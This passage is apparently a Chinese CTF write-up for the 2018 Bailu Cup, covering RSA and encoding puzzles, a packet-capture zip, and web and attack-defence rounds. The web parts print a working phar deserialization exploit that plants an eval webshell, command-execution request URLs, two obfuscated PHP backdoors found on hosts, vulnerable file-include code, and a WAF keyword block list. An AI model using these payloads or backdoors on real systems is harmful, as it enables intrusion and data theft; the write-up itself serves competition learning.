186032272305421028365295602810159191055078633881059737011784127699357480578433240110432805495328517379885306237631225477566136721077348329866885731002878563684349453668924250445128775992616650275173644658245397235667490402628 import gmpy2 from Crypto.Util.number import * k=gmpy2.iroot(n//10+1,2)[0]+1 print(k) for i in range(0xfffffff): f=k-i if i%10000==0: print(i,end=\" \") if n%f==0: print(i,n) break p=f q=n//f assert(p*q==n) phi=(p-1)*(q-1) e= 65537 d=gmpy2.invert(e,phi) m=pow(c,d,n) print(long_to_bytes(m)) # 4971490805710648894784063900603982138103528416416093113682856149525895474391965093292856360186270533203485404384261736770807923420477678768335595268260058770929420214670794184479653642688593773001265441972139034999789321709099375988424776953616924996952770970955016095518058970453801153351600603001621188113472370286189729979231943525793160692844078376540082324198649179890017101800683049489232021392715915700831833371902425005874555370189042455321691195416425399507551235346773377429357933240695935997956969841660473107352934178051894901298644110556291216221039424250078546978571086275993790666829060240691673857284132895978717935677825502362997789971900863003499701755174512295162461514926135376073693593713246781021035797102243028802222257489266812730745381990847604727619717567202686948267842932198278066304365500430012440700948799107940169074390644763691400614036677335457180241108468029814414775113509028739480597728378 # 0 59 247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 # b'ISEC{simp13_crypt0}' Crypto2 基因会突变，BASE64与Caesar也变异 加密密文: AUikzgRpLWaVIEaeKrqkJiieLhhqvf6= ​ 格式: ISEC{ }\n我好像不太懂╮(╯▽╰)╭\nCrypto3 problem 1 2 RSA(829467319, 48357) 322517722,575397051,76525646,768452152,107590034,710690594,322517722,174907762,343945760,763355610,301647581,349705569,575397051,76525646,410109929,322517722,497916224,228868281,228868281,741167939,497916224,450014050,322517722,322517722,126657310,349705569,322517722,707637171,76525646,527107437,710690594,685252839,450014050,349705569,388149253,710690594,763355610,211593791,707637171,369453331,228868281,541631545,397988536,322517722,12982396,107590034,387385119,322517722,685252839,710690594,322517722,109170298,349705569,763355610,349705569,349705569,37195518,25028382,610867628,44896265,25028382,454683367,15283689 solve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # -*- coding : utf-8 -*- # __author__ = 'https://github.com/findneo' import gmpy2 n=829467319 # 使用yafu离线分解得到p,q p = 36497 q = 22727 e=48357 assert(p*q==n) phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) c=[322517722,575397051,76525646,768452152,107590034,710690594,322517722,174907762,343945760,763355610,301647581,349705569,575397051,76525646,410109929,322517722,497916224,228868281,228868281,741167939,497916224,450014050,322517722,322517722,126657310,349705569,322517722,707637171,76525646,527107437,710690594,685252839,450014050,349705569,388149253,710690594,763355610,211593791,707637171,369453331,228868281,541631545,397988536,322517722,12982396,107590034,387385119,322517722,685252839,710690594,322517722,109170298,349705569,763355610,349705569,349705569,37195518,25028382,610867628,44896265,25028382,454683367,15283689] s=''.join(map(lambda ci:chr(pow(ci,d,n)),c)) print(s) # _stIwn_:!oAestN_rii.ra__}e_gt8nuae1nolg0iYf_2w{_un_CeoeeEhychST MISC MISC1 部分ICMP包DATA字段携带数据，且逐字节为504B…，很显然是个压缩包，使用命令行工具tshark提取对应字段。\ntshark用法参考tshark --help 或 Wireshark命令行工具tshark使用小记 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ tshark -r pcapng.pcapng -Y \"icmp and icmp.ident==0x930a\" -T fields -e data | xxd -r -p \u003e flag.zip \u0026\u0026 xxd flag.zip 00000000: 504b 0304 1400 0100 0000 0386 584d 2a17 PK..........XM*. 00000010: fbf2 3200 0000 2600 0000 0800 0000 666c ..2...\u0026.......fl 00000020: 6167 2e74 7874 c541 e340 943c a98d fc66 ag.txt.A.@.\u003c...f 00000030: 952e 0ffe 9ff3 8797 7647 b934 6d3d 8d3d ........vG.4m=.= 00000040: b94c fc2d cb14 16f3 723a ab5c 5e7f 0903 .L.-....r:.\\^... 00000050: 64ea 7b5b 1ae0 1a4c 504b 0102 3f00 1400 d.{[...LPK..?... 00000060: 0100 0000 0386 584d 2a17 fbf2 3200 0000 ......XM*...2... 00000070: 2600 0000 0800 2400 0000 0000 0000 2000 \u0026.....$....... . 00000080: 0000 0000 0000 666c 6167 2e74 7874 0a00 ......flag.txt.. 00000090: 2000 0000 0000 0100 1800 cee8 7c47 766b ...........|Gvk 000000a0: d401 7d2d ec42 766b d401 7d2d ec42 766b ..}-.Bvk..}-.Bvk 000000b0: d401 504b 0506 0000 0000 0100 0100 5a00 ..PK..........Z. 000000c0: 0000 5800 0000 0000 0050 ..X......P neo@u:/mnt/d/cwd/bailu/mis1$ 使用ziperello爆破密码为q，得到flag{d27ca49cb6f5583ae9f3bb2ec38190de} 。\nMISC2 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003esafe box\u003c/title\u003e \u003cstyle\u003e body { text-align: center; } input { font-size: 200%; margin-top: 5em; text-align: center; width: 26em; } #result { margin-top: 8em; font-size: 300%; font-family: monospace; font-weight: bold; } body.granted\u003e#result::before { content: \"Access Granted\"; color: green; } body.denied\u003e#result::before { content: \"Access Denied\"; color: red; } #content { display: none; } body.granted #content { display: initial; } @keyframes spin { from { transform: rotateY(0); } to { transform: rotateY(360deg); } } .cube { animation: spin 20s infinite linear; } .cube div { position: absolute; width: 200px; height: 200px; background: rgba(0, 0, 0, 0.51); box-shadow: inset 0 0 60px white; font-size: 20px; text-align: center; line-height: 200px; color: rgba(0,0,0,0.5); font-family: sans-serif; text-transform: uppercase; } \u003c/style\u003e \u003cscript\u003e function adler32(str) { var a = 1, b = 0, L = str.length, M = 0, c = 0, d = 0; for (var i = 0; i \u003c L;) { M = Math.min(L - i, 3850); while (M \u003e 0) { c = str.charCodeAt(i++); if (c \u003c 0x80) { a += c; } else if (c \u003c 0x800) { a += 192 | ((c \u003e\u003e 6) \u0026 31); b += a; --M; a += 128 | (c \u0026 63); } else if (c \u003e= 0xD800 \u0026\u0026 c \u003c 0xE000) { c = (c \u0026 1023) + 64; d = str.charCodeAt(i++) \u0026 1023; a += 240 | ((c \u003e\u003e 8) \u0026 7); b += a; --M; a += 128 | ((c \u003e\u003e 2) \u0026 63); b += a; --M; a += 128 | ((d \u003e\u003e 6) \u0026 15) | ((c \u0026 3) \u003c\u003c 4); b += a; --M; a += 128 | (d \u0026 63); } else { a += 224 | ((c \u003e\u003e 12) \u0026 15); b += a; --M; a += 128 | ((c \u003e\u003e 6) \u0026 63); b += a; --M; a += 128 | (c \u0026 63); } b += a; --M; } a = (15 * (a \u003e\u003e\u003e 16) + (a \u0026 65535)); b = (15 * (b \u003e\u003e\u003e 16) + (b \u0026 65535)); } return ((b % 65521) \u003c\u003c 16) | (a % 65521); } function check(х){ if(х!=\"0x0201\"\u0026\u0026adler32(х)==adler32(\"0x0201\")){ return true; } else{ return false; } } function open_safe() { keyhole.disabled = true; password = /^password{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value); if (!password || !check(password[1])) return document.body.className = 'denied'; document.body.className = 'granted'; content.value = \"\\x00\\x00\\x00\\x00\\x00\\x83\\x00\\x00\\x00N\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x00\\x06\\x05KP\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x04\\x01\\x00\\x0bxu[\\xd1\\x9e\\x8d\\x03\\x00\\x05TUtxt.galf\\x00\\x00\\x00\\x00\\x81\\xa4\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x08\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0cMY\\x95\\x8f\\x00\\x00\\x00\\t\\x00\\n\\x03\\x1e\\x02\\x01KP\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0c\\x08\\x07KP\\x045R\\tM\\xc2\\xde\\x14sg\\x92\\xd0K\\xbfh\\x9c\\x08\\xeb\\xf3@\\x9d\\x00\\x14\\x8b^\\xfb\\xa5\\x96O\\xc0\\xdd\\x8a(\\xe6\\x0c\\x92\\x1e \\xad\\x86\\xa6@\\xbc@J=\\x11Z\\xfe\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x04\\x01\\x00\\x0bxu[\\xd1\\x9e\\xfb[\\xd1\\x9e\\x8d\\x03\\x00\\tTUtxt.galf\\x00\\x1c\\x00\\x08\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0cMY\\x95\\x8f\\x00\\x00\\x00\\t\\x00\\n\\x04\\x03KP\"; } \u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e \u003cinput id=\"keyhole\" autofocus onchange=\"open_safe()\" placeholder=\"🔑\"\u003e \u003c/div\u003e \u003cdiv id=\"result\"\u003e \u003c/div\u003e \u003cdiv\u003e \u003cinput id=\"content\"\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e solve 显然密码正确后输出的conten.value是一个压缩包反转后的内容，提取得到压缩包发现加密，猜测密码要能走通JS逻辑。\n1 2 s=\"\\x00\\x00\\x00\\x00\\x00\\x83\\x00\\x00\\x00N\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x00\\x06\\x05KP\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x04\\x01\\x00\\x0bxu[\\xd1\\x9e\\x8d\\x03\\x00\\x05TUtxt.galf\\x00\\x00\\x00\\x00\\x81\\xa4\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x08\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0cMY\\x95\\x8f\\x00\\x00\\x00\\t\\x00\\n\\x03\\x1e\\x02\\x01KP\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0c\\x08\\x07KP\\x045R\\tM\\xc2\\xde\\x14sg\\x92\\xd0K\\xbfh\\x9c\\x08\\xeb\\xf3@\\x9d\\x00\\x14\\x8b^\\xfb\\xa5\\x96O\\xc0\\xdd\\x8a(\\xe6\\x0c\\x92\\x1e \\xad\\x86\\xa6@\\xbc@J=\\x11Z\\xfe\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x04\\x01\\x00\\x0bxu[\\xd1\\x9e\\xfb[\\xd1\\x9e\\x8d\\x03\\x00\\tTUtxt.galf\\x00\\x1c\\x00\\x08\\x00\\x00\\x00%\\x00\\x00\\x001=\\x16\\x04\\x0cMY\\x95\\x8f\\x00\\x00\\x00\\t\\x00\\n\\x04\\x03KP\" f=open('extract.zip','wb').write(s[::-1]) 使用JavaScript爆破密码：\n1 2 3 4 5 6 7 8 9 10 11 function dec2hexString(dec) { return '0x' + (dec+0x10000).toString(16).substr(-4).toUpperCase(); } function bruteforce(){ for(var i = 0;i\u003c0xffff;i++){ if(check(dec2hexString(i)))console.log(\"password{\"+dec2hexString(i)+\"}\") } } bruteforce() // password{0x0120} √ // password{0x1011} × 或者使用python爆破：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 # /^password{([0-9a-zA-Z_@!?-]+)}$/ def adler32(s): i=0;a=1;b=0;M=0;c=0;d=0 while i\u003clen(s): M=min(len(s)-i,3850) while M\u003e0: c=ord(s[i]);i+=1 if c\u003c 0x80: a+=c elif c\u003e0xd800 and c \u003c 0xe000: c= (c \u0026 1023) +64 ;d = s[i]\u00261023;i+=1 a+=240 | ((c \u003e\u003e 8) \u0026 7); b += a; M-=1 a += 128 | ((c \u003e\u003e 2) \u0026 63); b += a; M-=1 a += 128 | ((d \u003e\u003e 6) \u0026 15) | ((c \u0026 3) \u003c\u003c 4); b += a; M-=1 a += 128 | (d \u0026 63) else: a += 224 | ((c \u003e\u003e 12) \u0026 15); b += a;M-=1 a += 128 | ((c \u003e\u003e 6) \u0026 63); b += a;M-=1 a += 128 | (c \u0026 63) b+=a;M-=1 a = (15 * (a \u003e\u003e 16) + (a \u0026 65535)) b = (15 * (b \u003e\u003e 16) + (b \u0026 65535)) return ((b % 65521) \u003c\u003c 16) | (a % 65521) import itertools for i in itertools.product('0123456789',repeat=4): p='0x'+''.join(i) if adler32(p)==adler32('0x0201'): print p, # [0x0120] 0x0201 0x1011 密码为password{0x0120} ，解压得到flag。flag{cjvf33_98hfi3_jfh3_dsh93h_f3had} 。\nMISC3 给了1321个TXT，每个文件一个字符，内容如下。提示时间戳，没搞懂要干啥。\n1 2 $ cat ./* Money is not evil by itself.Its just paper with perceived value to obtain other things we value in other ways.If not money - what is. evil you may ask?Evil is the unquenchable, obsessive and moral bending desire for more.Evil is the bottomless, soulless and obsessive-compulsive pursuit of some pot of gold.at the end of some rainbow which doesn't exist.Evil is having a price tag for your heart and soul in exchange for financial success at any cost.Evil is trying to buy happiness, again and again.until all of those fake, short lived mirages of emotions are gone.Make more time.I'm not saying you can't be financially successful.I'm saying have a greater purpose in life well beyond the pursuit of financial success.Your soul is screaming for you to answer your true calling.You can change today if you redefine what success is to you.You can transform your damaged relationships and build new ones.You can forgive yourself and others who've hurt you.You can become a leader by mentoring with others who you aspire to be like.You can re-balance your priorities in life.You can heal your marriage and recreate a stronger love than you ever thought possible.You can become the best parent possible at any age - even 86.but don't wait until then...You will always be able to make more money.But you cannot make more time. 记录一个获取文件时间的方式。\n1 2 import subprocess a=subprocess.check_output((\"stat\",\"-c\", \"%y\", file_name)) Web Web1 万能密码\nWeb2 主页CTRL+U，发现源码泄露。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //http://172.16.17.2/file_aq12ws.php \u003c?php if(isset($_GET['filename'])){ $filename=$_GET['filename']; class MyClass{ var $output = 'echo \"hahaha\";'; function __destruct() { eval($this -\u003e output); } } file_exists($filename); } else{ highlight_file(__FILE__); } 这是前段时间black hat上提到的利用phar伪协议在一些文件系统函数中触发反序列化漏洞。\nphar文件本质上是一个压缩文件，在manifest部分存放每个被压缩文件的权限、属性等信息和用户自定义的meta-data数据，后者是以序列化后的形式存在的。而PHP中大部分文件系统函数在通过 phar:// 伪协议解析phar文件时，都会将meta-data反序列化。因此就有了本题的反序列化触发点file_exists函数。除了file_exists还有下图所示的函数，详见 利用 phar 拓展 php 反序列化漏洞攻击面 。\n所以本题的思路是先生成一个meta-data中包含恶意object的phar文件，然后通过上传点上传该文件得到路径，再在 file_aq12ws.php 通过filename参数以phar:// 方式包含该文件，就将在file_exists函数处触发phar文件的meta-data的反序列化，就可以得到一个web shell。\n要生成phar文件，需要 phar.readonly 为Off，即值为0。而出于安全性考虑，该项默认使能，值为1。当php.ini文件中的phar.readonly值为0时，可以使用ini_set在脚本中设为1或0；当值为1时，只能通过修改php.ini文件来修改值而不能通过脚本修改。也就是说，我们需要在生成phar文件前修改php.ini中phar.readonly值的Off。详细说明见 文档 。\n生成phar包的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u003c?php class MyClass{ var $output = '@eval($_GET[\"cmd\"]);'; function __destruct() { eval($this -\u003e output); } } $evil_object=new MyClass();//生成恶意对象 $file_name=\"test.phar\";//后缀必须为phar if(file_exists($file_name))unlink('test.phar');//删除当前目录下已有的phar包 $phar=new Phar($file_name); $phar-\u003estartBuffering(); $phar-\u003esetStub(\"\u003c?php __HALT_COMPILER(); ?\u003e\");//设置stub，可理解为phar文件的标志 $phar-\u003esetMetadata($evil_object);//将恶意对象作为自定义的meta-data传入manifest $phar-\u003eaddFromString(\"foo.txt\",\"bar\");//添加压缩文件及其内容 $phar-\u003estopBuffering(); 访问该代码后目录下会生成test.phar 文件，重命名为test.gif ，上传后访问 target.ip/file_aq12ws.php?filename=phar://test.gif\u0026cmd=phpinfo(); 见到phpinfo页面就说明成功了。\n1 2 3 4 5 6 7 8 9 10 11 12 $ xxd test.phar 00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d \u003c?php __HALT_COM 00000010: 5049 4c45 5228 293b 203f 3e0d 0a70 0000 PILER(); ?\u003e..p.. 00000020: 0001 0000 0011 0000 0001 0000 0000 003b ...............; 00000030: 0000 004f 3a37 3a22 4d79 436c 6173 7322 ...O:7:\"MyClass\" 00000040: 3a31 3a7b 733a 363a 226f 7574 7075 7422 :1:{s:6:\"output\" 00000050: 3b73 3a32 303a 2240 6576 616c 2824 5f47 ;s:20:\"@eval($_G 00000060: 4554 5b22 636d 6422 5d29 3b22 3b7d 0700 ET[\"cmd\"]);\";}.. 00000070: 0000 666f 6f2e 7478 7403 0000 000a 5ffb ..foo.txt....._. 00000080: 5b03 0000 00aa 8cff 76b6 0100 0000 0000 [.......v....... 00000090: 0062 6172 7533 2162 c819 a6d5 6019 ab22 .baru3!b....`..\" 000000a0: 7e2e f1df 96d7 b375 0200 0000 4742 4d42 ~......u....GBMB 1 2 3 http://172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif\u0026a=system('find / | grep flag'); http://172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif\u0026a=system('cat /var/www/html/sdf3r_df3erdf/flag.txt'); flag{qwe3_89fdsf3_jjnj3ioxc_ozxov} AWD Web attack\n一上来D盾扫出几个后门。用其中一个连了菜刀，在E:\\wwwroot\\RequestFlag\\ 发现url.bat ，内容为：curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key ，在目标机上执行该命令可以得到对方flag。\n1 curl \"http://172.16.18.13/wordpress/wp-includes/customize/class-wp-customize-background-image-list.php\" -d \"-7=system('E:\\wwwroot\\RequestFlag\\curl.exe https://FlagServer.com:9000/flag --cacert E:\\wwwroot\\RequestFlag\\ca.crt --cert E:\\wwwroot\\RequestFlag\\client.crt --key E:\\wwwroot\\RequestFlag\\client.key');\" 用的木马是wwwroot\\wordpress\\wp-includes\\customize\\class-wp-customize-background-image-list.php ，相当于@assert(${_POST}[-7]); 。\n1 2 3 4 5 \u003c?php @$_ = \"s\" . \"s\" . /*-/*-*/\"e\" . /*-/*-*/\"r\"; @$_ = /*-/*-*/\"a\" . /*-/*-*/$_ . /*-/*-*/\"t\"; @$_/*-/*-*/($/*-/*-*/{\"_P\" . /*-/*-*/\"OS\" . /*-/*-*/\"T\"} [/*-/*-*/0/*-/*-*/ - /*-/*-*/2/*-/*-*/ - /*-/*-*/5/*-/*-*/]); 在WAF上配了一些敏感字符正则后观察日志，发现另一个大家用的比较多的后门，wwwroot\\wordpress\\wp-includes\\pomo\\tp.php ，等价于@ASsERT(eval(@$_POST[cmd])); 。\n1 2 3 \u003c?php ${(\"#\" ^ \"|\") . (\"#\" ^ \"|\")} = (\"!\" ^ \"`\") . (\"( \" ^ \"{\") . (\"(\" ^ \"[\") . (\"~\" ^ \";\") . (\"|\" ^ \".\") . (\"*\" ^ \"~\"); @${(\"#\" ^ \"|\") . (\"#\" ^ \"|\")}((\"-\" ^ \"H\") . (\"]\" ^ \"+\") . (\"[\" ^ \":\") . (\",\" ^ \"@\") . (\"}\" ^ \"U\") . (\"~\" ^ \"\u003e\") . (\"e\" ^ \"A\") . (\"(\" ^ \"w\") . (\"j\" ^ \":\") . (\"i\" ^ \"\u0026\") . (\"#\" ^ \"p\") . (\"\u003e\" ^ \"j\") . (\"!\" ^ \"z\") . (\"]\" ^ \"\u003e\") . (\"@\" ^ \"-\") . (\"[\" ^ \"?\") . (\"?\" ^ \"b\") . (\"]\" ^ \"t\")); 后来发现两处文件包含。可以利用./ 和../ 分隔关键字绕过WAF，因为醒悟的比较晚和自动化做得不够方便，这个没有发挥太大作用。\nwwwroot\\wordpress\\wp-content\\plugins\\localize-my-post\\ajax\\include.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u003c?php //Include WP base to have the basic WP functions include_once($_SERVER['DOCUMENT_ROOT'] . \"/wp-blog-header.php\"); //Set status 200 header //Include requested file if it exists if(isset($_REQUEST['file'])){ $file=$_REQUEST['file']; $file = str_replace('./','',$file); header('HTTP/1.1 200 OK'); include($file); } 和 wwwroot\\wordpress\\wp-content\\plugins\\site-editor\\editor\\extensions\\pagebuilder\\includes\\ajax_shortcode_pattern.php\n1 2 3 4 5 6 7 8 \u003c?php if( isset( $_REQUEST['ajax_path'] ) ){ $ajax_path=$_REQUEST['ajax_path']; $ajax_path = str_replace('../','',$ajax_path); require_once $ajax_path; } ... 此外，有些队伍过滤了system，exe等关键字，采用反引号，base64编码，rot13编码等尝试绕过。\n也许因为check机制不好使，某个时间开始大约一半以上的队伍选择关站保平安，即使只是访问对方主页也会被WAF拦截。这不难实现，只要在WAF里面把IP当关键字过滤掉就可以。这大概不太厚道吧，但黑客嘛，也许就是理解并打击规则？\n没挖出啥洞，我好菜啊。而且WAF这么强，挖出来也用不上吧。\ndefense\n一开始就在WAF上把D盾扫出来的几个可疑文件加入黑名单，后来又配了敏感关键字exec|system|exe|curl|flag|base64|filter|cmd|-7|{|rot13 等，所以Web基本只在刚开始的几轮失分。\n全程就是每轮打一下，看看WAF有没拦到有趣的东西，挣扎着试图挖到洞，以及尝试一些绕过关键字的方法。\nPWN attack\n因为Web手比较菜:(，PWN手帮忙看了半天Web，开始搞PWN的时间比较晚，心态有点崩，最后思路来得晚，全程没打出分，很可惜。也许后面研究下王博的WP再复现一下。\ndefense\n权限问题动不了PWN文件，patch无门，基本坐着挨打。同样可能因为check机制的问题，存在一个fork炸弹躺下装死的防御思路。\n挨打要立正 拿到两个第二确实是赛前没想到的，但这改变不了我菜的本质。队友们虽然比我强，但是也依然有很大进步空间，包括更扎实的基础，更熟练的操作，更灵活的思路，更默契的配合等等。\n第一天突围赛刚开始比较顺利，最后五分钟被夜影师傅所在队伍反超，放上他们的逆向writeup：181124 逆向-2018“柏鹭杯”厦大邀请赛初赛（Re1、2） ，以弥补本文不足。\n第二天AWD则全程被北航吊打，伏地膜。\n因为看到某群里有人吐槽这是垃圾比赛，我觉得这个说法不太负责任，所以作为厦大学生多说两句。从题目来说。crypto一题有点脑洞，一题简单，一题中等，可以接受，misc也是相对合格的，Web题思路清晰，也有有趣的东西。reverse，PWN中也不乏质量不错的题，做出题的师傅也是认可其有自己特点的。\n除了题目，比赛奖金也是很高的，闭幕式到场的嘉宾也是够级别的，比赛环境可以说相当不错，住宿交通也很人性化。从各个角度来说，这都可以算是一场有诚意的，有愿望办好且确实做得不错的比赛。所以不管是因为没被邀请、做不出题、确实感觉题目质量不行、现场厕所不够用、志愿者里面漂亮小姐姐不够多还是其他什么原因而觉得不爽的，吐槽时把话说清楚还是比较好的，免得引起不必要的误解。明年应该还会举办，欢迎路过的大佬来玩。\n当然，要改进的东西还是蛮多的，反思不应该由我来做，简单说点自己的感受。最不理想的大概是AWD的check，这个称为健康检查的东西好像分不清怎样是健康。其次是使用WAF作为Web防守的工具固然可以让即使是像我这样的AWD经验不足的选手都可以很舒服，也减轻维护压力，但这样是没法打出刺激的AWD的，再加上check和我一样菜，除了没搞清楚状况的选手，有坚定原则的选手，很可能出现全场全线WAF，那就没啥好打的了。最后是PWN没有给选手patch的权限，这是不太正常的，直接导致最好的防护是把自己搞down，不管主办方是出于维护难度考虑还是什么，对真正有能力且想打一场有意思的比赛的选手来说游戏体验是不太好的。所以如果揪住这几点发表比较严厉的批评的话我是没话说的😔\n最后，感谢队友带飞。\n","wordCount":"1898","inLanguage":"en","datePublished":"2018-11-25T20:25:37+08:00","dateModified":"2018-11-25T20:25:37+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/181125-bailucup-writeup/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>2018 柏鹭杯 writeup</h1><div class=post-meta><span title='2018-11-25 20:25:37 +0800 CST'>November 25, 2018</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/181125-bailucup-writeup.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#ctf aria-label=CTF>CTF</a><ul><li><a href=#crypto aria-label=Crypto>Crypto</a><ul><li><a href=#crypto1 aria-label=Crypto1>Crypto1</a><ul><li><a href=#problem aria-label=problem>problem</a></li><li><a href=#solve aria-label=solve>solve</a></li></ul></li><li><a href=#crypto2 aria-label=Crypto2>Crypto2</a></li><li><a href=#crypto3 aria-label=Crypto3>Crypto3</a><ul><li><a href=#problem-1 aria-label=problem>problem</a></li><li><a href=#solve-1 aria-label=solve>solve</a></li></ul></li></ul></li><li><a href=#misc aria-label=MISC>MISC</a><ul><li><a href=#misc1 aria-label=MISC1>MISC1</a></li><li><a href=#misc2 aria-label=MISC2>MISC2</a><ul><li><a href=#problem-2 aria-label=problem>problem</a></li><li><a href=#solve-2 aria-label=solve>solve</a></li></ul></li><li><a href=#misc3 aria-label=MISC3>MISC3</a></li></ul></li><li><a href=#web aria-label=Web>Web</a><ul><li><a href=#web1 aria-label=Web1>Web1</a></li><li><a href=#web2 aria-label=Web2>Web2</a></li></ul></li></ul></li><li><a href=#awd aria-label=AWD>AWD</a><ul><li><a href=#web-1 aria-label=Web>Web</a></li><li><a href=#pwn aria-label=PWN>PWN</a></li></ul></li><li><a href=#%e6%8c%a8%e6%89%93%e8%a6%81%e7%ab%8b%e6%ad%a3 aria-label=挨打要立正>挨打要立正</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const 